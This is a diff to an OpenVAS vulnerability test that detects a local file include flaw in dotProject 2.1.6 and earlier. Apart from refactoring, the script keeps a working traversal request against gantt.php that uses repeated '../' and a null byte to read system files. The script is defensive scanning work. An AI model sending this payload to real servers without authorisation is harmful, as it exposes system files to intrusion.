@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_dotProject_lfi_11_12.nasl 5641 2017-03-21 08:24:30Z cfi $
+# $Id: gb_dotProject_lfi_11_12.nasl 5715 2017-03-24 11:34:41Z cfi $
 #
 # dotProject <= 2.1.6 Local File Include Vulnerability
 #
@@ -34,22 +34,16 @@ further attacks.
 
 dotProject <= 2.1.6 is vulnerable.";
 
-
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103608";
-
 if (description)
 {
- script_oid(SCRIPT_OID);
- script_version ("$Revision: 5641 $");
+ script_oid("1.3.6.1.4.1.25623.1.0.103608");
+ script_version ("$Revision: 5715 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
-
  script_name("dotProject <= 2.1.6 Local File Include Vulnerability");
-
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/22708/");
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 09:24:30 +0100 (Tue, 21 Mar 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 12:34:41 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-11-14 16:55:36 +0100 (Wed, 14 Nov 2012)");
- script_summary("Determine if it is possible to read a local file");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
@@ -62,33 +56,33 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
+include("host_details.inc");
    
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if(!can_host_php(port:port))exit(0);
-
-dirs = make_list("/dotproject",cgi_dirs());
 files = traversal_files();
 
-foreach dir (dirs) {
-  foreach file(keys(files)) {
-   
-    url = dir + "/index.php"; 
+foreach dir( make_list_unique( "/dotproject", cgi_dirs( port:port ) ) ) {
 
-    if(http_vuln_check(port:port, url:url,pattern:"<title>dotProject")) {
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
+  buf = http_get_cache( item:url, port:port );
+
+  if( "<title>dotProject" >< buf ) {
+
+    foreach file( keys( files ) ) {
 
       url = dir + "/modules/projectdesigner/gantt.php?dPconfig[root_dir]=" + crap(data:"../", length:9*6) + files[file] + '%00';
 
-      if(http_vuln_check(port:port, url:url,pattern:file)) {
-        security_message(port:port);
-        exit(0);
-      }  
+      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report );
+        exit( 0 );
+      }
     }
-  }  
+  }
 }
 
-exit(0);
+exit( 99 );
